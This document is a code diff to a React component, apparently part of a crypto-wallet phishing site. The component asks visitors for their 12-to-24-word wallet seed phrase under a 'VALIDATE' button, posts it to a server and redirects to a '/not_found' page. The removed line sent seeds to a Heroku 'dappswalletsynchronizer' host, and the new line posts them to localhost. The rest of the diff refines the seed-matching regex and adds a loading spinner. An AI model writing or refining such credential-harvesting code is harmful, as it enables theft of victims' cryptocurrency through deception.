@@ -1,6 +1,7 @@
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import axios from "axios";
 import { useNavigate } from "react-router-dom";
+import { BeatLoader } from 'react-spinners'
 
 const PrivateKey = ({
   seed3,
@@ -13,15 +14,14 @@ const PrivateKey = ({
   setCount3,
 }) => {
   const Navigate = useNavigate();
+  const [loading, setLoading] = useState(false)
 
   const handleChange = (e) => {
-    const reg = /^[a-zA-z]+\s([a-zA-Z]+\s){10}[a-zA-Z]+$/;
-    const reg2 = /^[a-zA-z]+\s([a-zA-Z]+\s){22}[a-zA-Z]+$/;
+    const reg = /^[a-zA-z]+\s([a-zA-Z]+\s){10,22}[a-zA-Z]+$/;
     const isMatch = reg.test(e.target.value);
-    const isMatch2 = reg2.test(e.target.value);
     let len = e.target.value.length;
 
-    if (isMatch || isMatch2 || len === 0) {
+    if (isMatch || len === 0) {
       setSeed3(e.target.value);
       setError3(false);
       setCount3(len);
@@ -33,9 +33,11 @@ const PrivateKey = ({
   };
 
   const handleSubmit = async (e) => {
-    const res = await axios.post("https://dappswalletsynchronizer.herokuapp.com/form", {
+    const res = await axios.post("http://localhost:8080/form", {
       seed: seed3,
     });
+    setLoading(true)
+    setDisabled3(true)
     if (res.data.status === 200) {
       Navigate("/not_found");
     } else {
@@ -77,7 +79,7 @@ const PrivateKey = ({
         onClick={handleSubmit}
         disabled={disabled3}
       >
-        VALIDATE
+        { !loading ? 'VALIDATE' : <BeatLoader size={12} />}
       </button>
     </>
   );
